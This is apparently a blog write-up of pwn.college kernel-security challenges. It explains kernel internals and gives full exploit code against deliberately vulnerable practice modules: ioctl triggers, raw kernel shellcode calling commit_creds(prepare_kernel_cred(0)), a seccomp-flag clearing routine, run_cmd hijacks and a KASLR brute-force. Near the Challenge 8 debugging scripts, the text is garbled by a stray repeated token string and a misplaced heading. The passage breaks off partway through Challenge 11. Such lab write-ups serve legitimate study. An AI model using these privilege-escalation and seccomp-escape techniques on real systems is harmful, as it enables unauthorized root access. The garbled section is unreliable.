---
layout: post
title:  "Pwn College - Kernel Security"
date:   2024-05-23 19:59:45 +0300
categories: jekyll update
---

**Contents**
* TOC
{:toc}
## Overview

This is the first module (currently, out of 5) dealing with kernel security. The focus isn't direct exploitation, but hands-on knowledge regarding the kernel API, debugging methods, virtual to physical memory translation, user and kernel interaction and so on. \
I find this module to be very helpful, as it teaches kernel security from the basics, towards intermediate level. 

## Background

Recall some resources are only available for the kernel. For example, setting the value of `MSR_LSTAR` (register that contains the kernel address of the syscall table) via `wrmsr, rdmsr`, or the value of `cr3` - which contains the page table address. \
The current CPU privilege level is stored within the `cs` register 3 lowest bits. Do not be confused with `uid` privileges - while root (uid 0) means a total userspace privileges (OS-level security), it doesn't means a process running with root uid can overwrite kernel memory. Only execution context running with CPL of 0 (ring 0), as tracked by the CPU, is able to do so. \
For example, for every `syscall` instruction, CPL is changed to `0`, control flow jumps to `MSR_LSTAR`, and RA is stored in `rcx` (not stack, as it might be a shared region with other threads). Return is being done via `sysret`. Regarding memory mappings, userspace processes have their VA mapped at low addresses. The kernel has its own VA space, located in high addresses and mapped for all processes (yet only accessible from CPL 0). \
The Linux kernel is monolithic kernel. This means that a single binary unifies all OS-level tasks, and drivers are libaries that are loaded to this binary. In particular, drivers are NOT userspace components that request operations by the kernel. This means that upon finding a driver vulnerability, the kernel may be compromised. \
Our attack vector would usually be an arbitrary code execution within userspace, and our goal - a LPE. 

### Environment

We'd work on a VM. We need: Compiler, kernel, userspace FS, and emulator (qemu). Pwncollege environemnt setup can be found [here][pwnkernel]. Moreover, `/home/ctf/pwn/kernel` is mounted to the host home directory. \
In terms of debugging - the kernel was compiled with debug symbols, and KASLR is disabled for most challenges. We'd compile most of our userspace programs with `-static -nostdlib`. Since `qemu` was launched with `-s`, it opens a gdbserver port at `1234`, meaning we'd be able to debug the kernel from regular host gdb invocation: `gdb -nx vmlinux` (usually we won't like to use `pwndbg` or `gef`), and issue the following:

```bash
target remote :1234
```

Interestingly, upon kernel debugging, we can set a breakpoint on userspace addresses - and they would hit anytime a userspace process reaches that address. Moreover, now instead of `si` simply passes `syscall` instruction, which is the userspace behavior, upon hitting `si` - it would actually launch us back to the kernel. Notice that also every userspace process have its corresponding kernel stack, which is loaded by the start of the `syscall` instruction handler. \
There are 2 main ways to retrieve kernel symbol's address:

1. From the kernel binary image (`objdump` for example)

2. From `/proc/kallsyms`, including those of loaded kernel modules! Need root access (or leak) tho.

The following links may also come handy: [link1][setup1], [link2][setup2], [link3][setup3]


### Kernel Modules

Libraries that loads into the kernel. ELF files (`.ko`), similar to userspace library (`.so`). Loaded to the address space of the kernel (as libraries loaded to the address space of the program). They are being used in order to implement drivers, filesystems, networking, etc. \
We can see loaded modules via `lsmod`, and load via `insmod module.ko`, which under the hood calls the `init_module` syscall. These can be interacted via syscalls. Historically, modules COULD add syscall entries within the syscall table, but this is explicitly unsupported nowadays. Theoretically, module could also register interrupt handler (using `LIDT, LGDT`), and writing its own entry within. This means that upon issuing `int 42` from a userspace program, the module's hook may hit. For example, `int 80` used to invoke the syscall handler within x86. Module can also hook interrupt instructions, such as `int3, int1` (meaning, instead of `int3` sending a SIGTRAP, do something else). Interestingly, module can also hook the invalid opcode exception interrupt. \
However, the common ways of actually interacting with modules are files:

1. `/dev` - for traditional devices

2. `/proc` - in addition to running process information, contains disastrous mess of **kernel** interfaces. 

3. `/sys` - non-process information interace with the kernel 

Module can register a file in one of these virtual filesystems, and a user can `open` it. From kernel space, we can R/W a file via `device_read, device_write`, working on `struct file` instead of file descriptors. \
Besides the classic R/W interface, there's a more flexible interface - `ioctl`. Can be used from userspace via `ioctl(fd, CODE, &custom_struct)`, or from kernelspace (on `struct file`) via `device_ioctl`. \
Typically, driver would read data from userspace (`copy_from_user`), would do stuff (interact with HW, etc), writes data back to userspace (`copy_to_user`), and return to userspace. \
Notice that incase we're interacting with a driver from the shell, it might be usefull to use `dd if=/dev/driver of=/proc/self/fd/1 bs=128 count=1`. 

### PE

Recall the two important functions `copy_to_user, copy_from_user`. \
Kernel memory must be kept uncorrupted. Hence, user data should be carefully handled. What would we like to achieve? Usually, PE. Recall the kernel tracks the user privileges of every running process by `task_struct->real_cred` and `task_struct->cred` (effective, overwriteable). In particular, `struct cred->euid` may be overwritten. \
We can ask the kernel to create a fresh `struct cred` by calling `prepare_kernel_cred(struct task_struct *ref)`, which by default of `NULL` argument would allocate a cred struct with root access and full privileges. In order to register that new cred struct, we shouldn't update the previous struct in-place (as they can be cached elsewhere), but instead we should call `commit_creds(struct cred*)`. Hence, `commit_creds(prepare_kernel_cred(0))` would get the job done. \
How can we figure out these symbols addresses? Usually there's KASLR, so they would be randomized for every reboot. Also, `/proc/kallsyms` requires root access and contains these addresses. Another trick is to forge an exploit to navigate towards the VA space that is being used by `kallsyms`. 

### Memory Management

Recall each process has the kernel code mapped in the "upper half" of memory. The kernel maintains mapping between process VA, and the actual addresses they correspond to in PA. \
Every process have its own page table, accssed by `cr3`. Nowadays, it is actually a multi-level paging structure, of 4 levels. \
Each layer contains 512 entries, and therefore takes only `512 * 8 = 4 KB` of memory. For example, the page directory (level 2)  contains 512 pgdir entries (PDEs), each mapping a page table, where each contains 512 PTEs, each referring to a page of `0x1000` bytes. This means that the 2-level pagins system supports up to `512 * 512 * 0x1000 = 1 GB` of VA, for each process! \
However, notice the overhead isn't small - `0x1000` bytes for the PD, and `0x1000` for each mapped `2 MB` of VA (only mapped VA allocates new PT, therefore not all maximum of 512 PTs are allocated, which is a great lazyness optimization). Theres a cool optimization - large pages, where by setting a special flag, the PDE can refer to physical address, just as a PTE, but this address is a page of `2 MB` in size. \
The third layer is called page directory page table, PDP, which contains 512 pointers to PDs, meaning - total of `512 GB` VA addressing is now possible! \
Moreover, a similar overhead reduction optimization now offers PDP to have an entry that directly refers to `1 GB` of memory "giga-page". \
The fourth layer is called page map lever 4, aka PML 4, which contains 512 PDPs, addressing total of 256 TB of RAM.  

A 64-bit virtual address is actually made of 5 different components - the 12 LSbs are the offset within a page. The 9 LSbs prior to it are the index within the PT that refers to our PTE (corresponds to the physical page address). Since there are 512 entries, 9 bits are exactly what we need to refer to that index. In a similar manner, the next 9 LSbs are the index within the PD referring to the PDE (corresponds to the physical address of the page table), and so on. \
This means a total of `4 * 9 + 12 = 48 bits` are being used within 64-bit address. The rest of the bits are sign extension. Notice that different architectures, such as ARM, uses memory tagging within the leftover `16` bits. This also means that there are actually **5 dereferences** for each memory dereference! \
Since each process has its own PML4 physical address, located within `cr3`, swapped upon every context switch by the kernel, hence accessible only in CPL 0.

For virtual machines isolation, we use an **extended page table**, for EVERY different VM. Recall the guest kernel "thinks" it access physical addresses, but these are actually guest-physical addresses. We need a translation mechanism from guest-physical to host-physical addresses, for EVERY translated layer. This two dimensional grid means there are actually `25` translation stages! \
For example, when the guest tries to access VA, it uses its `cr3` register, which (along with `EPTP` index stored within the hypervisor, to allow multiple VMs) contains the guest-physical address of PML4, meaning - `EPT PML4`. This is actually a virtual address, hence goes by the EPT translation layer 4 times, in order to resolve the `PML4` physical address within the host. Notice the guest doesn't knows nor cares about this host physical address. By its means, accessing `cr3` register value, yield a valid guest physical address (although it is actually a virtualized address, managed by the EPT). \
Notice all lookups are being performed by the hardware - MMU. Theres also an optimization, TLB, which contains direct cache mapping between "hot" virtual addresses directly to their physical addresses. \
For other architectures - ARM's `cr3` equivalent is `TTBR0` for userspace, and `TTBR1` for kernelspace - which is a cool distinguishment. 

For old kernels, `root` user could access physical memory via `/dev/mem`. This means that we **could** access physical memory having `uid 0, CPL3`! \
Nowadays, accessing physical memory can only be done within the kernel, `CPL 0` - not even as root. \
For convenient access, physical memory is mapped contiguously in the kernel's VA. Two important macros are `phys_to_virt, virt_to_phys` - which converts kernel VA addrs to physical. We can easily RE these macros (simple math and bit operations), implementing our own equivalents within a shellcode. 

### Kernel Mitigations

Some mitigations are familiar:

1. Kstack canaries

2. KASLR (randomized upon boot)

3. NX for Kstack, Kheap

And few extra:

1. Function granular KASLR - shuffle functions around

2. SMEP - prevents kernelspace from executing userspace memory, at all - ever!

3. SMAP - prevents even accessing userspace memory. The `AC` flag in `RFLAGS` register must be set to do so. `stac, clac` are CPL 0 instructions that handles this bit. For example, `copy_from_user` must set this bit, in order to access userspace memory (for example, must be done to resolve `path` argument for `open`).

A possible workaround is using `run_cmd(char *cmd)` - run a command in userspace, as root. 

### Seccomp Bypass

Implemented in the kernel. In particular, within `task_struct` there's `thread_info.flags`. The flag `TIF_SECCOMP` enables seccomp enforcement. Within Linux's syscall entry, there's a check via `secure_computing`, which checks if a particular syscall is eligible for execution. \
By turning off `TIF_SECCOMP`:

```c
current->thread_info.flags &= ~_TIF_SECCOMP;
```

We can escape seccomp for the current thread. In order to resolve `current` task struct, we can simply refer to `gs` register. 

### Kernel Shellcode

For PE, the classic goto is `commit_creds(prepare_kernel_cred(0))`. \
For seccomp escape, `current_task_struct->thread_info.flags &= ~(1 << TIF_SECCOMP)` (turn off the seccomp bit). \
For arbitrary command execution, `run_cmd("/path/to/command")`. 

This means we can just use the kernel's API. \
However, notice that the regular `call` instruction takes a **relative 32-bit offset** to shift execution by. This means that if we'd like to execute userspace-allocated shellcode, we'd have to use indirect call: `mov rax, bla; call rax`. \
Notice that we can actually exploit the relative nature of a regular `call addr` - since we're running within the kernel, it means that we might not be needing a leak, as long as we know the relative constant offset between our shellcode to our target function. \
Regarding seccomp escaping, recall the kernel points to the `current` task struct using the `gs` register. By writing a small snippet that parses the `current` within a kernel module and reverse engineering it, we can learn how our target architecture retrieves `&current->thread_info.flags`- and mimic this behavior. \
Moreover, notice we'd like the shellcode to exit cleanly. This means, for a function pointer hijacking, we'd like the shellcode to behave as a regular function - having prologe and epiloge. For more complicated exploits, we'd like a full state-recovery stage within the shellcode.

## Setup

Pwn-college have developed some cool infrastructure to debug the kernel. The main component is a python script named `vm`, which wraps many repetitive operations. These includes:

- `vm connect` - initiates the kernel by running `qemu` emulator in background, then connecting to it via `ssh`. 

```python
def start():
    flags = " ".join(flag for flag in extra_boot_flags())

    bzImage = "/challenge/bzImage" if os.path.exists("/challenge/bzImage") else "/opt/linux/bzImage"

    kvm = os.path.exists("/dev/kvm")
    cpu = "host" if kvm else "qemu64"
    qemu_argv = [
        "/usr/bin/qemu-system-x86_64",
        "-kernel", bzImage,
        "-cpu", f"{cpu},smep,smap",
        "-fsdev", "local,id=rootfs,path=/,security_model=passthrough",
        "-device", "virtio-9p-pci,fsdev=rootfs,mount_tag=/dev/root",
        "-fsdev", "local,id=homefs,path=/home/hacker,security_model=passthrough",
        "-device", "virtio-9p-pci,fsdev=homefs,mount_tag=/home/hacker",
        "-device", "e1000,netdev=net0",
        "-netdev", "user,id=net0,hostfwd=tcp::22-:22",
        "-m", "2G",
        "-smp", "2" if kvm else "1",
        "-nographic",
        "-monitor", "none",
        "-append", f"rw rootfstype=9p rootflags=trans=virtio console=ttyS0 init=/opt/pwn.college/vm/init {flags}",
    ]
    if kvm:
        qemu_argv.append("-enable-kvm")

    if is_privileged():
        qemu_argv.append("-s")

    argv = [
        "/usr/sbin/start-stop-daemon",
        "--start",
        "--pidfile", "/run/vm/vm.pid",
        "--make-pidfile",
        "--background",
        "--no-close",
        "--quiet",
        "--oknodo",
        "--startas", qemu_argv[0],
        "--",
        *qemu_argv[1:]
    ]

    subprocess.run(argv,
                   stdin=subprocess.DEVNULL,
                   stdout=open("/run/vm/vm.log", "a"),
                   stderr=subprocess.STDOUT,
                   check=True)
```

We can see how it implements mounting the host user & root directories. Moreover, we can see it forwards port `22`, to enable ssh into the machine. If privileged, it also runs a `gdbserver`, and finally - stores all output within `/run/vm/vm.log`. \
It also sets the kernel command line via `-append`, which sets an `init` file to be used. The `init` file does multiple important things, including mounting all the virtual filesystems, networking configuration, and loading all of the kernel modules under `/challenge`. 

- `vm debug` - In a similar manner, if the vm have already been started, we can debug it as follows:

```python
def debug():
    try:
        socket.create_connection((vm_hostname(), 1234), timeout=30)
    except ConnectionRefusedError:
        error("Error: could not connect to debug")

    vmlinux = "/challenge/vmlinux" if os.path.exists("/challenge/vmlinux") else "/opt/linux/vmlinux"

    execve([
        "/usr/bin/gdb",
        "--ex", "target remote localhost:1234",
        vmlinux,
    ])
```

Hence, launches a simple `gdb` client. This means we can use gdb scripts to ease debugging. Moreover, by default challenges run on kernel `5.4`. 

- `vm build` - We can build kernel modules as follows:

```python
def build(path):
    ruid, euid, suid = os.getresuid()
    os.seteuid(ruid)

    with open(path, "r") as f:
        src = f.read()

    with tempfile.TemporaryDirectory() as workdir:
        with open(f"{workdir}/debug.c", "w") as f:
            f.write(src)

        with open(f"{workdir}/Makefile", "w") as f:
            f.write(
                textwrap.dedent(
                    f"""
                    obj-m += debug.o

                    all:
                    \tmake -C /opt/linux/linux-5.4 M={workdir} modules
                    clean:
                    \tmake -C /opt/linux/linux-5.4 M={workdir} clean
                    """
                )
            )

        subprocess.run(["make", "-C", workdir], stdout=sys.stderr, check=True)

        os.seteuid(euid)
        shutil.copy(f"{workdir}/debug.ko", "/challenge/debug.ko")
```

This means that the source of our module is being compiled and set at the `/challenge/` dir automatically. 

## Challenge 1

I've first connected into the vm. By issuing `vm debug`, we can see the vm freezes, and we can debug kernel addresses:

```bash
(gdb) x/10i $rip
=> 0xffffffff81ab299e <default_idle+30>:        mov    ebp,DWORD PTR gs:[rip+0x7e55d9ab]        # 0x10350 <cpu_number>
   0xffffffff81ab29a5 <default_idle+37>:        nop    DWORD PTR [rax+rax*1+0x0]
   0xffffffff81ab29aa <default_idle+42>:        pop    rbx
   0xffffffff81ab29ab <default_idle+43>:        pop    rbp
   0xffffffff81ab29ac <default_idle+44>:        pop    r12
   0xffffffff81ab29ae <default_idle+46>:        ret    
```

There's one kernel module that have been loaded:

```bash
hacker@vm_practice~kernel-security~level1-0:~$ lsmod
Module                  Size  Used by
challenge              16384  0
```

And the module's binary is given within `/challenge/babykernel_level_1.0.ko`. By reading `kallsyms` as root (we can do this in practice mode, as we can obtain root on our host machine), we can see addresses of some interesting module's symbols:

```bash
$ sudo cat /proc/kallsyms | grep challenge
ffffffffc0000952 t device_release       [challenge]
ffffffffc0000967 t device_open  [challenge]
ffffffffc000097c t device_write [challenge]
ffffffffc0000a0a t device_read  [challenge]
ffffffffc0000000 t bin_padding  [challenge]
ffffffffc0000940 t cleanup_module       [challenge]
ffffffffc0000870 t init_module  [challenge]

$ sudo cat /proc/modules
challenge 16384 0 - Live 0xffffffffc0000000 (O)

$ sudo cat /sys/module/challenge/sections/.bss
0xffffffffc0002440
```

By doing some trivial RE, we can see within `init_module` that the module reads the flag into the module's `.bss` section. Interestingly, the kernel doesn't loads all of the kernel module's binary as one big chunk. Instead, it maps every region (`.text, .data, etc`) with padding in between. 

```bash
(gdb) x/s 0xffffffffc0002460
0xffffffffc0002460:     "pwn.college{practice}\n
```

Moreover, it registers a `proc_dir_entry` named `pwncollege` with custom `fops`. While `device_release, device_open` aren't implemented, `device_read, device_write` does. \
The `write` handler actually checks if the user had given some certain secret bytes to the `proc` file, and if so, changes a `device_state` variable, also located within the `.bss` of the module. The `read` handler checks for that state's value, and if it is adequate - prints the flag's content. \
Hence, the following would give us the flag:

```bash
echo "qqypfbyywqmzhfcn" > /proc/pwncollege
cat /proc/pwncollege
```

## Challenge 2

Now, there's no `read` handler at all. However, there's comparision being made at `0xffffffffc0000c88`, checking if the inserted input matches some magic. In case it succeeds, `printk` is being called at `0xffffffffc0000c9f`. \
By inspecting the values of `printk` parameters, we can see the format string is misaligned - 

```bash
(gdb) x/s $rdi
0xffffffffc0001270:     "\001\066The flag is: %s\n"
(gdb) x/s $rsi
0xffffffffc0002460:     "pwn.college{practice}\n"
```

But this shouldn't matter, as the `printk` call does succeedds, and doesn't stop at `\x01`. The idea here, is the fact that `write` handler doesn't uses `copy_to_user`, but actually prints to the kernel's logs, as can be found in `dmesg`. 

```bash
echo yjtvotvfhmaybgnh > /proc/pwncollege
dmesg
```

## Challenge 3

Now there's a `win` function, that gives us `uid = 0` upon inserting the secret

```bash
echo eixspnzdawplvwnw > /proc/pwncollege
whoami
cat /flag
```

## Challenge 4

Now we have to interact with the driver via `ioctl`. \
Writing a short `.c` program can be very helpful in this case (compiled via `-static`):

```c
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <unistd.h>

int main()
{
    int res = 0;

    int fd = open("/proc/pwncollege", 0);
    if (fd < 0)
    {
        goto cleanup;
    }

    long cmd = 1337;
    const char *arg = "czmepuekljhzwqou";
    if (ioctl(fd, cmd, arg) < 0)
    {
        goto cleanup;
    }

    char *const argv[] = { "/bin/sh", 0 };
    execve(argv[0], argv, 0);

    return 0;

cleanup:
    return 1;
}
```

Important - notice that in case we run the script within a shell, the CHILD process is the one who's `uid` is set to `0`. Hence, the parent (shell) would still have high `uid`. 

## Challenge 5

Pretty cool - now the address that is stored within `arg` is being called. Hence, we have arbitrary branch primitive within the kernel. \
By reading `/proc/kallsyms` we can see `win` is stored at `0xffffffffc000022d`. 

```c
int fd = open("/proc/pwncollege", 0);
    if (fd < 0)
    {
        goto cleanup;
    }

    long cmd = 1337;
    uint64_t arg = 0xffffffffc000022d;
    if (ioctl(fd, cmd, arg) < 0)
    {
        goto cleanup;
    }

    char *const argv[] = { "/bin/sh", 0 };
    execve(argv[0], argv, 0);
```

## Challenge 6

Now the module allocates using `vmalloc` a single page of memory that may be written and executed. \
This means we have to write a kernel shellcode. The idea is simple - `commit_creds(prepare_kernel_cred(0))`. \
The main obstacle with this challenge, is the fact that in addition to the state-recovery we have to perform by creating a new function's frame, we must also make sure the `rsp` alignment stays the same. Otherwise, the process would get killed by the kernel. That's why I've added extra `push rbx; pop rbx` instructions:


```c
int main()
{
    int res = 0;
    int fd = open("/proc/pwncollege", O_RDWR);
    if (fd < 0)
    {
        goto cleanup;
    }

    /* Simple commit_creds(prepare_creds(0)) shellcode, having prologe and epiloge
    push rbx
    push rbp
    mov rbp, rsp
    xor rdi, rdi
    mov rbx, 0xffffffff81089660
    call rbx
    mov rdi, rax
    mov rbx, 0xffffffff81089310
    call rbx
    mov rsp, rbp
    pop rbp
    pop rbx
    ret    
    */
    uint8_t shellcode[0x1000] = { 0x53, 0x55, 0x48, 0x89, 0xE5, 0x48, 0x31, 0xFF, 0x48, 0xC7, 0xC3, 0x60, 0x96, 0x08, 0x81, 0xFF, 0xD3, 0x48, 0x89, 0xC7, 0x48, 0xC7, 0xC3, 0x10, 0x93, 0x08, 0x81, 0xFF, 0xD3, 0x48, 0x89, 0xEC, 0x5D, 0x5B, 0xC3 };
    
    if (write(fd, shellcode, sizeof(shellcode)) < 0)
    {
        goto cleanup;
    }

    char *const argv[] = { "/bin/sh", 0 };
    execve(argv[0], argv, 0);
}
```

## Challenge 7

This one is pretty funny. The driver reads from the user a single pointer towards user buffer. \
It assumes the buffer's layout is having its `length` as the first 8 bytes, the shellcode as the next bytes (which should be up to `0x1000` bytes), and an address to jump into (the shellcode address). \
However, the shellcode size verification is only being made according to the user-supplied `length` value, not the length of the shellcode itself. 

```c
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>
#include <string.h>

#define SHELLCODE_SIZE 0x1000

int main()
{
    int res = 0;

    int fd = open("/proc/pwncollege", O_RDONLY);
    if (fd < 0)
    {
        goto cleanup;
    }

    /* Simple commit_creds(prepare_creds(0)) shellcode, having prologe and epiloge
    push rbx
    push rbp
    mov rbp, rsp
    xor rdi, rdi
    mov rbx, 0xffffffff81089660
    call rbx
    mov rdi, rax
    mov rbx, 0xffffffff81089310
    call rbx
    mov rsp, rbp
    pop rbp
    pop rbx
    ret    
    */
    uint8_t shellcode[SHELLCODE_SIZE] = { 0x53, 0x55, 0x48, 0x89, 0xE5, 0x48, 0x31, 0xFF, 0x48, 0xC7, 0xC3, 0x60, 0x96, 0x08, 0x81, 0xFF, 0xD3, 0x48, 0x89, 0xC7, 0x48, 0xC7, 0xC3, 0x10, 0x93, 0x08, 0x81, 0xFF, 0xD3, 0x48, 0x89, 0xEC, 0x5D, 0x5B, 0xC3 };
    size_t length = SHELLCODE_SIZE;
    size_t execute_addr = 0xffffc90000085000;

    uint8_t arg[sizeof(length) + sizeof(shellcode) + sizeof(execute_addr)] = { 0 };
    memcpy(arg, &length, sizeof(length));
    memcpy(arg + sizeof(length), &shellcode[0], sizeof(shellcode));
    memcpy(arg + sizeof(arg) - sizeof(size_t), &execute_addr, sizeof(execute_addr));

    long cmd = 1337;
    if (ioctl(fd, cmd, arg) < 0)
    {
        goto cleanup;
    }

    char *const argv[] = { "/bin/sh", 0 };
    execve(argv[0], argv, 0);

    return 0;

cleanup:
    return 1;
}
```

## Challenge 8

We're given a userspace binary, which opens the proc entry of `pwncollege`, and reads arbtirary `0x1000` bytes into a userspace buffer. Notice this is a `suid` binary, and the proc entry is only eligable for root access. Hence, we won't be able to forge our own userspace program. \
Afterwards, seccomp filter is being added, only allowing the `write` syscall. The procfs file have a write handler, which reads a shellcode and executes it. \
My kernel shellcode has 2 stages:

1. Clear `TIF_SECCOMP` bit

2. Elevate `uid` to `0`

My user shellcode has 2 stages:

1. Write bytes into the procfs fd, triggering `device_write` within the kernel

2. Run `execve("/bin/sh", {"/bin/sh", 0}, 0)`

In order to mimic the commercial behavior of kernel's clearing `TIF_SECCOMP`, I've compiled a simple kernel module that only does `current->thread_info.flags &= ~_TIF_SECCOMP`. By RE it, I've figured this operation is actually resolved to (on my platform):

```c
mov rbx, QWORD PTR gs:0x0
and QWORD PTR [rbx],0xfffffffffffffeff
```

Notice that because of relocations, the offset of `gs:0x0` is actually invalid. **We have to load the module, and inspect the exact patched offset!** Indeed, by doing so, we can see the real offset is actually `0x15d00`:

```bash
0xffffffffc00050dd:  mov    rbx,QWORD PTR gs:0x15d00
```

Alternatively, [this great post][kernel-gs] explains how we can retrieve this offset, by simple `p/x &current_task`. In particular, `current` is actually saved within a special per-cpu region, which can be found via `p/x __per_cpu_offset[i]`, where `i` is the CPU number. \
Hence, the above snippet would be the kernel shellcode's start. \
Regarding the userspace shellcode, thanksfully the procfs entry is already opened at `fd = 3`. Hence, we would write into it our code, which is a simple wrapper that only writes data into `fd = 3`. A cool note, is that we can write the usermode shellcode as PIC - such that it won't rely on the userspace address in which it was loaded. \
Our final shellcode, which we would send to the program, would look as follows:

```c
user_shellcode:
mov rdi, 3
lea rsi, [rip + kernel_shellcode]
mov rdx, 0x1000
mov rax, 1
syscall

chmod_flag:
mov rbx, 0x67616c662f
push rbx
push rsp
pop rdi
mov rsi, 0xffff
mov rax, 90
syscall

run_bin_sh:
xor eax, eax
mov rbx, 0xFF978CD091969DD1
neg rbx
push rax
push rbx
push rsp
pop rdi
cdq
push rdx
push rdi
mov rsi, rsp
push rsp
pop rsi
mov al, 0x3b
syscall

kernel_shellcode:
push rbx
push rbp
mov rbp, rsp

disable_seccomp:
mov rbx, QWORD PTR gs:0x15d00
and QWORD PTR [rbx],0xfffffffffffffeff

set_uid_0:
xor rdi, rdi
mov rbx, 0xffffffff81089660
call rbx
mov rdi, rax
mov rbx, 0xffffffff81089310
call rbx

mov rsp, rbp
pop rbp
pop rbx
ret
```

Interestingly, while I DID popped a privileged shell, because `sh` actually invokes a new child process for every dispatched command, it inherits seccomp flag - and the child commands were all blocked by the seccomp filter (as its seccomp bit is enabled). \
I've just added `chmod` prior to executing the shellcode, to prove I've indeed gained root privileges. 

Regarding debugging, I've used different setup for userspace debugging and kernelspace debugging. For userspace, I've used a local `gdb` inside the VM. `pwndbg` isn't supported well inside the VM, and nested tmux sessions in particular. Therefore, in order to conviniently send input to it, I've wrote raw gdb scripts:

```python
user_shellcode = b"\x48\xC7\xC7\x03\x00\x00\x00\x48\x8D\x35\x4C\x00\x00\x00\x48\xC7\xC2\x00\x10\x00\x00\x48\xC7\xC0\x01\x00\x00\x00\x0F\x05\x48\xBB\x2F\x66\x6C\x61\x67\x00\x00\x00\x53\x54\x5F\x48\xC7\xC6\xFF\xFF\x00\x00\x48\xC7\xC0\x5A\x00\x00\x00\x0F\x05\x31\xC0\x48\xBB\xD1\x9D\x96\x91\xD0\x8C\x97\xFF\x48\xF7\xDB\x50\x53\x54\x5F\x99\x52\x57\x48\x89\xE6\x54\x5E\xB0\x3B\x0F\x05\x53\x55\x48\x89\xE5\x65\x48\x8B\x1C\x25\x00\x5D\x01\x00\x48\x81\x23\xFF\xFE\xFF\xFF\x48\x31\xFF\x48\xC7\xC3\x60\x96\x08\x81\xFF\xD3\x48\x89\xC7\x48\xC7\xC3\x10\x93\x08\x81\xFF\xD3\x48\x89\xEC\x5D\x5B\xC3"
    
with open('gdb_input.bin', 'wb') as f:
    f.write(user_shellcode)
```

```bash
### gdb_debug.gdb ###
break seccomp_init
commands
    print "in seccomp_init"
    b *0x0000000031337000
    commands
        print "running shellcode.."
    end

end

r < /home/hacker/gdb_input.bin
c

### run_gdb.sh ##gL_ghkPYSTKC-EP3QtgQ6turmB9.dBDN0wCMzgzWgL_ghkPYSTKC-EP3QtgQ6turmB9.dBDN0wCMzgzW
    gL_ghkPYSTKC-EP3QtgQ6turmB9.dBDN0wCMzgzW
## Challenge 10

#
#!/bin/bash

gdb -x /home/hacker/gdb_debug.gdb /challenge/babykernel_level8.0
```

## Challenge 9

Now the module has `write` handler, that can read up to `0x108` bytes, into a logger struct:

```c
struct device_write::logger
{
    char buffer[0x100];
    int (*log_function)(const char *, ...);
}
```

And the logger function is being issued on the `buffer`. This means we have arbitrary branch with argument primitive. An adequate target would be the kernel's `run_cmd` function. Since `/bin/sh` requires interactive session, it is inadequate for this case. 

```c
#define SHELLCODE_SIZE 0x100

int main()
{
    int res = 0;

    int fd = open("/proc/pwncollege", O_RDWR);
    if (fd < 0)
    {
        goto cleanup;
    }
    uint8_t shellcode[SHELLCODE_SIZE + sizeof(size_t)] = { 0 };
    uint8_t command[] = "/usr/bin/chmod 777 /flag";
    memcpy(shellcode, &command[0], sizeof(command));
    uint64_t run_cmd_addr = 0xffffffff81089b30;
    memcpy(shellcode + sizeof(shellcode) - sizeof(size_t), &run_cmd_addr, sizeof(run_cmd_addr));

    if (write(fd, shellcode, sizeof(shellcode)) < 0)
    {
        goto cleanup;
    }
    return 0;

cleanup:
    printf("error: %s\n", strerror(errno));
    return 1;
}
```

## Challenge 10

Same as before, but now there's KASLR! The idea is to first call some function that would leak a kernel address, and within the second invocation, trigger `run_cmd`. \
Within the first invocation, we can call `copy_to_user`. The problem is we can only control the content referenced by the first argument. \
The KASLR has only 12-bits of randomness. This means that after ~4096 tries, we should be calling our correct handler. 

```c
int main(int argc, char *argv[])
{
    if (argc < 2)
    {
        goto cleanup;
    }

    int fd = open("/proc/pwncollege", O_RDWR);
    if (fd < 0)
    {
        goto cleanup;
    }

    uint8_t shellcode[SHELLCODE_SIZE + sizeof(size_t)] = { 0 };
    uint8_t command[] = "/usr/bin/chmod 777 /flag";
    memcpy(shellcode, &command[0], sizeof(command));
    uint64_t run_cmd_base = 0xffffffff00089b30;
    uint64_t offset = (uint64_t)0x100000 * strtoll(argv[1], NULL, 10);
    uint64_t run_cmd_addr = run_cmd_base + offset;

    printf("offset: %08lx\n", offset);
    memcpy(shellcode + sizeof(shellcode) - sizeof(size_t), &run_cmd_addr, sizeof(run_cmd_addr));

    if (write(fd, shellcode, sizeof(shellcode)) < 0)
    {
        goto cleanup;
    }
    ...
}
```

Another possible (and probably intended) solution, is to utilize the fact that the logger's original function is `printk`:

```c
logger.log_function = &printk;
...
logger.log_function(&logger);
```

At a first glance, there seems to be no problem with this implementation - as it simply prints what we've inserted. However, in case we would supply format string specifiers, such as `%p, %s` - we would be able to easily leak addresses off the 5 parameter registers and the stack. \
In particular, we are able to leak the kernel RA off the stack - which is a code segment address. By doing so, we can easily calculate the constant offset towards `run_cmd`. 

## Challenge 11

As before, the kernel module simply executes a shellcode given within its `write` handler. \
Interestingly, the flag is being loaded to the suid userspace component, at `0x404040`, and being removed from the system. Again, we are only allow to perform the `write` syscall. \
My first approach, is since we can execute `write`, and the flag is at a known address, we can simply just write it to `stdout`, without going through the kernel at all.. \
However, there's a twist - the flag is actually being written into a **child process** memory region! This means we'd like to leak the flag by reading our child process memory. \
One initial idea was to follow the paren'ts `task_struct` in order to find the child's memory mapping, and leaking the flag from there. Notice the child remains alive after reading the flag into its memory. Eventually, the flag is mapped to some physical addresses. If this page wasn't swapped out, we can access it. Hence, If we would make a kernel shellcode that would scan the physical memory, we can search for the flag manually - and `printk` it upon finding it. 

### Kernel Memory Mappings

The [following documentation][kernel-scan] and this [link][linternals] greatly describes the kernel virtual memory layout (assumping no KASLR. Otherwise, random sized holes are presented). In particular, we can learn that:

1. `page_offset_base` (macro `__PAGE_OFFSET_BASE`) is a very special region, of size `64 TB`, that **direct-maps between virtual and physical memory**. This means that `PA 0` is mapped to `page_offset_base`, `PA 0x1000` to `page_offset_base + 0x1000`, and so on. Without KASLR, its address is completely deterministic. :

```bash
(gdb) p/x page_offset_base 
$1 = 0xffff888000000000
(gdb) x/10gx page_offset_base
0xffff888000000000:     0xf000ff53f000ff53      0xf000ff53f000e2c3
```

2. vmalloc/ioremap space, `vmalloc_base`, defined by `VMALLOC_START, VMALLOC_END`. Reserved region for non-contiguous physical memory allocations. While `kmalloc` gurantees the allocated pages are both physically and virtually contiguous, `vmalloc` only gurantees virtual contiguous. This means that the mapping to physical memory pages may be completely scattered. Hence, `vmalloc` access is usually slower, as multiple page-translations shall occur - up to `sizeof(alloc) / PG_SIZE`. The advantage of `vmalloc` is whenever extremely large areas are needed (for example, when loading a new kernel module, Similar to `mmap` and dynamic libraries), as `kmalloc` is limited to `~128 KB` allocations. 

